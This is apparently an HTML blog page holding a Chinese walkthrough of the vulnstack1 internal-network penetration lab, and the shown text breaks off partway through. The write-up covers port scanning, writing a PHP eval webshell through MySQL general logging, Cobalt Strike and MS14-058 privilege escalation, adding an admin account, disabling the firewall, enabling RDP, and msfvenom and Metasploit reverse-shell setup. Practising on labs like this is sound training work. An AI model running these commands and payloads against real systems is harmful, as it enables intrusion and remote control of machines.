@@ -1,0 +1,463 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="description" content="一、实验环境vulnstack1：http:&#x2F;&#x2F;vulnstack.qiyuanxuetang.net&#x2F;vuln&#x2F;detail&#x2F;2&#x2F;  实验环境： 12345攻击者本地：192.168.247.1攻击者KALI：192.168.247.146VM1：192.168.247.133（NAT）；192.168.52.128（host-only）VM2：192.169.52.141（host-only）">
+<meta property="og:type" content="article">
+<meta property="og:title" content="内网渗透靶场vulnstack系列：vulnstack1">
+<meta property="og:url" content="http://yoursite.com/2020/12/10/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BAvulnstack%E7%B3%BB%E5%88%97%EF%BC%9Avulnstack1/index.html">
+<meta property="og:site_name" content="R17a&#39;s blog">
+<meta property="og:description" content="一、实验环境vulnstack1：http:&#x2F;&#x2F;vulnstack.qiyuanxuetang.net&#x2F;vuln&#x2F;detail&#x2F;2&#x2F;  实验环境： 12345攻击者本地：192.168.247.1攻击者KALI：192.168.247.146VM1：192.168.247.133（NAT）；192.168.52.128（host-only）VM2：192.169.52.141（host-only）">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://yoursite.com/imgs/image-20210104092155239.png">
+<meta property="og:image" content="http://yoursite.com/imgs/image-20210104093203260.png">
+<meta property="og:image" content="http://yoursite.com/imgs/image-20210104093619989.png">
+<meta property="og:image" content="http://yoursite.com/imgs/image-20210104093735642.png">
+<meta property="og:image" content="http://yoursite.com/imgs/image-20210104094029801.png">
+<meta property="og:image" content="http://yoursite.com/imgs/image-20210104094249096.png">
+<meta property="og:image" content="http://yoursite.com/imgs/image-20210104102422357.png">
+<meta property="og:image" content="http://yoursite.com/imgs/image-20210104102841002.png">
+<meta property="og:image" content="http://yoursite.com/imgs/image-20210104103037015.png">
+<meta property="og:image" content="http://yoursite.com/imgs/image-20210104103206246.png">
+<meta property="og:image" content="http://yoursite.com/imgs/image-20210104103653614.png">
+<meta property="og:image" content="http://yoursite.com/imgs/image-20210104103734658.png">
+<meta property="og:image" content="http://yoursite.com/imgs/image-20210104104400525.png">
+<meta property="og:image" content="http://yoursite.com/imgs/image-20210104104546132.png">
+<meta property="og:image" content="http://yoursite.com/imgs/image-20210104105234329.png">
+<meta property="og:image" content="http://yoursite.com/imgs/image-20210104110133518.png">
+<meta property="og:image" content="http://yoursite.com/imgs/image-20210104110543441.png">
+<meta property="og:image" content="http://yoursite.com/imgs/image-20210104110555491.png">
+<meta property="og:image" content="http://yoursite.com/imgs/image-20210104112027050.png">
+<meta property="og:image" content="http://yoursite.com/imgs/image-20210104112223072.png">
+<meta property="og:image" content="http://yoursite.com/imgs/image-20210104112244913.png">
+<meta property="og:image" content="http://yoursite.com/imgs/image-20210104112339711.png">
+<meta property="og:image" content="http://yoursite.com/imgs/image-20210104112408944.png">
+<meta property="og:image" content="http://yoursite.com/imgs/image-20210104112433952.png">
+<meta property="og:image" content="http://yoursite.com/imgs/image-20210104112541347.png">
+<meta property="og:image" content="http://yoursite.com/imgs/image-20210104112637457.png">
+<meta property="og:image" content="http://yoursite.com/imgs/image-20210104112708473.png">
+<meta property="og:image" content="http://yoursite.com/imgs/image-20210105190802162.png">
+<meta property="og:image" content="http://yoursite.com/imgs/image-20210105191635013.png">
+<meta property="og:image" content="http://yoursite.com/imgs/image-20210106204224771.png">
+<meta property="og:image" content="http://yoursite.com/imgs/image-20210106204303715.png">
+<meta property="og:image" content="http://yoursite.com/imgs/image-20210106204627812.png">
+<meta property="og:image" content="http://yoursite.com/imgs/image-20210106204702450.png">
+<meta property="og:image" content="http://yoursite.com/imgs/image-20210106204743415.png">
+<meta property="og:image" content="http://yoursite.com/imgs/image-20210106204807779.png">
+<meta property="og:image" content="http://yoursite.com/imgs/image-20210106204848059.png">
+<meta property="og:image" content="http://yoursite.com/imgs/image-20210106204923573.png">
+<meta property="og:image" content="http://yoursite.com/imgs/image-20210106205035633.png">
+<meta property="og:image" content="http://yoursite.com/imgs/image-20210106205150473.png">
+<meta property="og:image" content="http://yoursite.com/imgs/image-20210112204903767.png">
+<meta property="og:image" content="http://yoursite.com/imgs/image-20210112205014287.png">
+<meta property="og:image" content="http://yoursite.com/imgs/image-20210112204720337.png">
+<meta property="og:image" content="http://yoursite.com/imgs/image-20210112204813073.png">
+<meta property="article:published_time" content="2020-12-09T16:03:14.000Z">
+<meta property="article:modified_time" content="2020-12-30T16:03:14.000Z">
+<meta property="article:author" content="R17a">
+<meta property="article:tag" content="内网安全">
+<meta property="article:tag" content="vulnstack">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://yoursite.com/imgs/image-20210104092155239.png">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>内网渗透靶场vulnstack系列：vulnstack1</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+      
+<link rel="stylesheet" href="/css/rtl.css">
+
+    
+    <!-- rss -->
+    
+    
+<meta name="generator" content="Hexo 4.2.1"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/search/">Search</a></li>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/tags/">Tags</a></li>
+         
+          <li><a href="/categories/">Categories</a></li>
+         
+          <li><a href="/about/">About</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" href="/2020/12/15/nexus%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" href="/2020/12/07/Zookeeper-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2020/12/10/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BAvulnstack%E7%B3%BB%E5%88%97%EF%BC%9Avulnstack1/" target="_blank" rel="noopener"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2020/12/10/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BAvulnstack%E7%B3%BB%E5%88%97%EF%BC%9Avulnstack1/&text=内网渗透靶场vulnstack系列：vulnstack1" target="_blank" rel="noopener"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2020/12/10/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BAvulnstack%E7%B3%BB%E5%88%97%EF%BC%9Avulnstack1/&title=内网渗透靶场vulnstack系列：vulnstack1" target="_blank" rel="noopener"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2020/12/10/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BAvulnstack%E7%B3%BB%E5%88%97%EF%BC%9Avulnstack1/&is_video=false&description=内网渗透靶场vulnstack系列：vulnstack1" target="_blank" rel="noopener"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=内网渗透靶场vulnstack系列：vulnstack1&body=Check out this article: http://yoursite.com/2020/12/10/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BAvulnstack%E7%B3%BB%E5%88%97%EF%BC%9Avulnstack1/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2020/12/10/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BAvulnstack%E7%B3%BB%E5%88%97%EF%BC%9Avulnstack1/&title=内网渗透靶场vulnstack系列：vulnstack1" target="_blank" rel="noopener"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2020/12/10/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BAvulnstack%E7%B3%BB%E5%88%97%EF%BC%9Avulnstack1/&title=内网渗透靶场vulnstack系列：vulnstack1" target="_blank" rel="noopener"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2020/12/10/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BAvulnstack%E7%B3%BB%E5%88%97%EF%BC%9Avulnstack1/&title=内网渗透靶场vulnstack系列：vulnstack1" target="_blank" rel="noopener"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2020/12/10/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BAvulnstack%E7%B3%BB%E5%88%97%EF%BC%9Avulnstack1/&title=内网渗透靶场vulnstack系列：vulnstack1" target="_blank" rel="noopener"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2020/12/10/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BAvulnstack%E7%B3%BB%E5%88%97%EF%BC%9Avulnstack1/&name=内网渗透靶场vulnstack系列：vulnstack1&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=http://yoursite.com/2020/12/10/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BAvulnstack%E7%B3%BB%E5%88%97%EF%BC%9Avulnstack1/&t=内网渗透靶场vulnstack系列：vulnstack1" target="_blank" rel="noopener"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#一、实验环境"><span class="toc-number">1.</span> <span class="toc-text">一、实验环境</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#二、实战"><span class="toc-number">2.</span> <span class="toc-text">二、实战</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1、目标192-168-247-133信息收集"><span class="toc-number">2.1.</span> <span class="toc-text">1、目标192.168.247.133信息收集</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2、Getshell"><span class="toc-number">2.2.</span> <span class="toc-text">2、Getshell</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3、本机信息收集并提权"><span class="toc-number">2.3.</span> <span class="toc-text">3、本机信息收集并提权</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4、内网信息收集"><span class="toc-number">2.4.</span> <span class="toc-text">4、内网信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#域相关信息收集"><span class="toc-number">2.4.1.</span> <span class="toc-text">域相关信息收集</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#探测内网存活主机"><span class="toc-number">2.4.2.</span> <span class="toc-text">探测内网存活主机</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#探测端口存活情况"><span class="toc-number">2.4.3.</span> <span class="toc-text">探测端口存活情况</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#梳理目前网络情况及攻击思路"><span class="toc-number">2.4.4.</span> <span class="toc-text">梳理目前网络情况及攻击思路</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5、横向渗透192-168-52-141"><span class="toc-number">2.5.</span> <span class="toc-text">5、横向渗透192.168.52.141</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#MSF反弹shell"><span class="toc-number">2.5.1.</span> <span class="toc-text">MSF反弹shell</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#或者CS派生会话到MSF"><span class="toc-number">2.5.2.</span> <span class="toc-text">或者CS派生会话到MSF</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#添加路由"><span class="toc-number">2.5.3.</span> <span class="toc-text">添加路由</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#设置代理"><span class="toc-number">2.5.4.</span> <span class="toc-text">设置代理</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#探测并尝试利用MS17-010漏洞，利用失败"><span class="toc-number">2.5.5.</span> <span class="toc-text">探测并尝试利用MS17-010漏洞，利用失败</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#发现平台里面给出了MS08-067，利用成功，getshell且权限为system"><span class="toc-number">2.5.6.</span> <span class="toc-text">发现平台里面给出了MS08-067，利用成功，getshell且权限为system</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#尝试将MSF会话派生到CS失败了"><span class="toc-number">2.5.7.</span> <span class="toc-text">尝试将MSF会话派生到CS失败了</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#6、渗透域控"><span class="toc-number">2.6.</span> <span class="toc-text">6、渗透域控</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#尝试利用MS17-010攻击域控也失败了"><span class="toc-number">2.6.1.</span> <span class="toc-text">尝试利用MS17-010攻击域控也失败了</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#redis获取DC"><span class="toc-number">2.6.2.</span> <span class="toc-text">redis获取DC</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#三、其它记录"><span class="toc-number">3.</span> <span class="toc-text">三、其它记录</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#四、参考链接"><span class="toc-number">4.</span> <span class="toc-text">四、参考链接</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        内网渗透靶场vulnstack系列：vulnstack1
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">R17a</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2020-12-09T16:03:14.000Z" itemprop="datePublished">2020-12-10</time>
+        
+        (Updated: <time datetime="2020-12-30T16:03:14.000Z" itemprop="dateModified">2020-12-31</time>)
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/vulstack/">vulstack</a> › <a class="category-link" href="/categories/vulstack/vulstack1/">vulstack1</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link" href="/tags/vulnstack/" rel="tag">vulnstack</a>, <a class="tag-link" href="/tags/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/" rel="tag">内网安全</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h3 id="一、实验环境"><a href="#一、实验环境" class="headerlink" title="一、实验环境"></a>一、实验环境</h3><p>vulnstack1：<a href="http://vulnstack.qiyuanxuetang.net/vuln/detail/2/" target="_blank" rel="noopener">http://vulnstack.qiyuanxuetang.net/vuln/detail/2/</a></p>
+<p><img src="/imgs/image-20210104092155239.png" alt="image-20210104092155239"></p>
+<p><strong>实验环境：</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">攻击者本地：192.168.247.1</span><br><span class="line">攻击者KALI：192.168.247.146</span><br><span class="line">VM1：192.168.247.133（NAT）；192.168.52.128（host-only）</span><br><span class="line">VM2：192.169.52.141（host-only）</span><br><span class="line">VM3：192.168.52.138（host-only）</span><br></pre></td></tr></table></figure>
+
+<p><strong>实验工具：</strong>AntSword、Coblat Strike、MSF、msfvenom</p>
+<p><strong>实验目的：</strong>在实践中学习内网渗透，主要为了练习，所以过程能学习到的地方都可以练一练。</p>
+<h3 id="二、实战"><a href="#二、实战" class="headerlink" title="二、实战"></a>二、实战</h3><h4 id="1、目标192-168-247-133信息收集"><a href="#1、目标192-168-247-133信息收集" class="headerlink" title="1、目标192.168.247.133信息收集"></a>1、目标192.168.247.133信息收集</h4><p>端口扫描，发现存在两个开放端口80 http、3306 mysql</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sC -sV -Pn -T5 192.168.247.133</span><br></pre></td></tr></table></figure>
+
+<p><img src="/imgs/image-20210104093203260.png" alt="image-20210104093203260"></p>
+<p>访问80端口是phpinfo，并从页面获取到以下信息。并且可以从页面下方测试mysql连接来进行数据库连接测试，随便输了root/root，便连上了</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">服务器：Windows NT STU1 6.1 build 7601 (Windows 7 Business Edition Service Pack 1) i586</span><br><span class="line">绝对路径：C:&#x2F;phpStudy&#x2F;WWW</span><br><span class="line">探针路径：C:&#x2F;phpStudy&#x2F;WWW&#x2F;l.php</span><br><span class="line">Php：5.4.45</span><br></pre></td></tr></table></figure>
+
+<p><img src="/imgs/image-20210104093619989.png" alt="image-20210104093619989"></p>
+<p>针对网站进行探测，发现存在以下页面</p>
+<p><img src="/imgs/image-20210104093735642.png" alt="image-20210104093735642"></p>
+<p>访问phpadmin，用root/root登录，果然进来了，发现mysql是5.5.53，并且存在其它数据库newyxcms，猜测应该存在其它没探测到的页面，先记录下，万一用得到。</p>
+<p><img src="/imgs/image-20210104094029801.png" alt="image-20210104094029801"></p>
+<p><img src="/imgs/image-20210104094249096.png" alt="image-20210104094249096"></p>
+<h4 id="2、Getshell"><a href="#2、Getshell" class="headerlink" title="2、Getshell"></a>2、Getshell</h4><p>首先考虑phpmyadmin漏洞利用，参考了<a href="https://www.cnblogs.com/liliyuanshangcao/p/13815242.html，尝试直接写入文件来getshell失败，没有写权限，尝试用日志记录写入shell" target="_blank" rel="noopener">https://www.cnblogs.com/liliyuanshangcao/p/13815242.html，尝试直接写入文件来getshell失败，没有写权限，尝试用日志记录写入shell</a> 成功了</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 开启日志记录</span></span><br><span class="line"><span class="keyword">set</span> <span class="keyword">global</span> general_log = <span class="string">"ON"</span>;</span><br><span class="line"><span class="comment"># 查看当前的日志目录</span></span><br><span class="line"><span class="keyword">show</span> <span class="keyword">variables</span> <span class="keyword">like</span> <span class="string">'general%'</span>;</span><br><span class="line"><span class="comment"># 指定日志文件，具体路径可以利用上面获取的绝对路径C:/phpStudy/WWW</span></span><br><span class="line"><span class="keyword">set</span> <span class="keyword">global</span> general_log_file = <span class="string">"C:/phpStudy/WWW/tt.php"</span>;</span><br><span class="line"><span class="comment"># 写入执行代码</span></span><br><span class="line"><span class="keyword">select</span> <span class="string">"&lt;?php eval($_POST[tt]);?&gt;"</span></span><br></pre></td></tr></table></figure>
+
+<p>访问并用蚁剑连接</p>
+<p><img src="/imgs/image-20210104102422357.png" alt="image-20210104102422357"></p>
+<p>Cobalt Strike上线，设置监听</p>
+<p><img src="/imgs/image-20210104102841002.png" alt="image-20210104102841002"></p>
+<p>生成payload</p>
+<p><img src="/imgs/image-20210104103037015.png" alt="image-20210104103037015"></p>
+<p>蚁剑终端执行payload，CS成功获取shell。</p>
+<p><img src="/imgs/image-20210104103206246.png" alt="image-20210104103206246"></p>
+<h4 id="3、本机信息收集并提权"><a href="#3、本机信息收集并提权" class="headerlink" title="3、本机信息收集并提权"></a>3、本机信息收集并提权</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Systeminfo</span><br><span class="line"><span class="comment"># 发现操作系统:windos7专业版 x_64，存在域：god.org，存在另一个网卡：192.168.52.128，主机名：STU1，补丁打了4个</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/imgs/image-20210104103653614.png" alt="image-20210104103653614"></p>
+<p><img src="/imgs/image-20210104103734658.png" alt="image-20210104103734658"></p>
+<p>Administrator权限 提权到system。参考了<a href="https://wiki.wgpsec.org/knowledge/hw/privilege.html#%E6%8F%90%E6%9D%83%E7%9A%84%E5%9F%BA%E7%A1%80%E6%A6%82%E5%BF%B5" target="_blank" rel="noopener">狼组提权文章</a>，未打MS14-058补丁KB3000061并且适用WIN7。</p>
+<p><img src="/imgs/image-20210104104400525.png" alt="image-20210104104400525"></p>
+<p>用CS的MS14-058提权</p>
+<p><img src="/imgs/image-20210104104546132.png" alt="image-20210104104546132"></p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ipconfig /all</span><br><span class="line"><span class="comment"># 存在双网卡，存在DNS服务器 192.168.52.138,可能为域控</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>收集主机密码</strong></p>
+<p>Administrator/Hongrisec@2019</p>
+<p><img src="/imgs/image-20210104105234329.png" alt="image-20210104105234329"></p>
+<p><strong>开启远程桌面</strong></p>
+<p>查看3389端口是否开启</p>
+<p><img src="/imgs/image-20210104110133518.png" alt="image-20210104110133518"></p>
+<p>添加帐号，开启远程桌面进行链接</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 添加账号</span></span><br><span class="line">net user test11 test@<span class="number">099</span> /add</span><br><span class="line">net localgroup administrators test11 /add</span><br><span class="line"></span><br><span class="line"><span class="comment"># 注册表开启3389端口</span></span><br><span class="line">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal<span class="string">" "</span>Server /v fDenyTSConnections /t REG_DWORD /d <span class="number">00000000</span> /f</span><br><span class="line"><span class="comment"># 如果反弹shell失败或者开启3389失败,需要关闭防火墙</span></span><br><span class="line">netsh advfirewall set allprofiles state off  <span class="comment"># 菜刀终端命令</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/imgs/image-20210104110543441.png" alt="image-20210104110543441"></p>
+<p><img src="/imgs/image-20210104110555491.png" alt="image-20210104110555491"></p>
+<p><strong>wmic本地自动化信息收集-out.html</strong></p>
+<p><img src="/imgs/image-20210104112027050.png" alt="image-20210104112027050"></p>
+<h4 id="4、内网信息收集"><a href="#4、内网信息收集" class="headerlink" title="4、内网信息收集"></a>4、内网信息收集</h4><h5 id="域相关信息收集"><a href="#域相关信息收集" class="headerlink" title="域相关信息收集"></a>域相关信息收集</h5><p>查询域：net view /domain</p>
+<p><img src="/imgs/image-20210104112223072.png" alt="image-20210104112223072"></p>
+<p>查询域内所有主机：net view /domain:god</p>
+<p><img src="/imgs/image-20210104112244913.png" alt="image-20210104112244913"></p>
+<p>查询所有域成员计算机列表：net group “domain computers” /domain</p>
+<p><img src="/imgs/image-20210104112339711.png" alt="image-20210104112339711"></p>
+<p>查找域控 机器名：nltest /DCLIST:god</p>
+<p><img src="/imgs/image-20210104112408944.png" alt="image-20210104112408944"></p>
+<p>查询域内用户和管理员信息：</p>
+<p>查询所有域用户列表：net user /domain</p>
+<p><img src="/imgs/image-20210104112433952.png" alt="image-20210104112433952"></p>
+<p>查看域管理员：net group “domain admins” /domain</p>
+<p><img src="/imgs/image-20210104112541347.png" alt="image-20210104112541347"></p>
+<h5 id="探测内网存活主机"><a href="#探测内网存活主机" class="headerlink" title="探测内网存活主机"></a>探测内网存活主机</h5><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> /L %I <span class="keyword">in</span> (<span class="number">1</span>,<span class="number">1</span>,<span class="number">254</span>) <span class="keyword">DO</span> @ping <span class="literal">-w</span> <span class="number">1</span> <span class="literal">-n</span> <span class="number">192.168</span>.<span class="number">247</span>.%I | findstr <span class="string">"TTL="</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/imgs/image-20210104112637457.png" alt="image-20210104112637457"></p>
+<p>或者用netbios探测</p>
+<p><img src="/imgs/image-20210104112708473.png" alt="image-20210104112708473"></p>
+<h5 id="探测端口存活情况"><a href="#探测端口存活情况" class="headerlink" title="探测端口存活情况"></a>探测端口存活情况</h5><p><img src="/imgs/image-20210105190802162.png" alt="image-20210105190802162"></p>
+<h5 id="梳理目前网络情况及攻击思路"><a href="#梳理目前网络情况及攻击思路" class="headerlink" title="梳理目前网络情况及攻击思路"></a>梳理目前网络情况及攻击思路</h5><p>目前内网还有两台主机，141和138，138是域控，两台主机都开了445端口，第一想到的是可能存在MS17-010漏洞直接利用，如果利用失败，可以考虑看看80和其它端口，另外还有一点就是域控可以利用前段时间新出的漏洞CVE-2020-1472。</p>
+<p><img src="/imgs/image-20210105191635013.png" alt="image-20210105191635013"></p>
+<h4 id="5、横向渗透192-168-52-141"><a href="#5、横向渗透192-168-52-141" class="headerlink" title="5、横向渗透192.168.52.141"></a>5、横向渗透192.168.52.141</h4><h5 id="MSF反弹shell"><a href="#MSF反弹shell" class="headerlink" title="MSF反弹shell"></a>MSF反弹shell</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p php&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;192.168.247.146 LPORT&#x3D;4444 -f raw &gt; 123.php</span><br><span class="line">msfconsloe</span><br><span class="line">use exploit&#x2F;multi&#x2F;handler</span><br><span class="line">set payload php&#x2F;meterpreter&#x2F;reverse_tcp</span><br><span class="line">set lhost 192.168.247.133</span><br><span class="line">set lport 4444</span><br><span class="line">Run</span><br></pre></td></tr></table></figure>
+
+<p><img src="/imgs/image-20210106204224771.png" alt="image-20210106204224771"></p>
+<h5 id="或者CS派生会话到MSF"><a href="#或者CS派生会话到MSF" class="headerlink" title="或者CS派生会话到MSF"></a>或者CS派生会话到MSF</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use multi&#x2F;handler</span><br><span class="line">set payload windows&#x2F;meterpreter&#x2F;reverse_tcp</span><br><span class="line">set lhost 192.168.247.146</span><br><span class="line">setlport 5555</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<p><img src="/imgs/image-20210106204303715.png" alt="image-20210106204303715"></p>
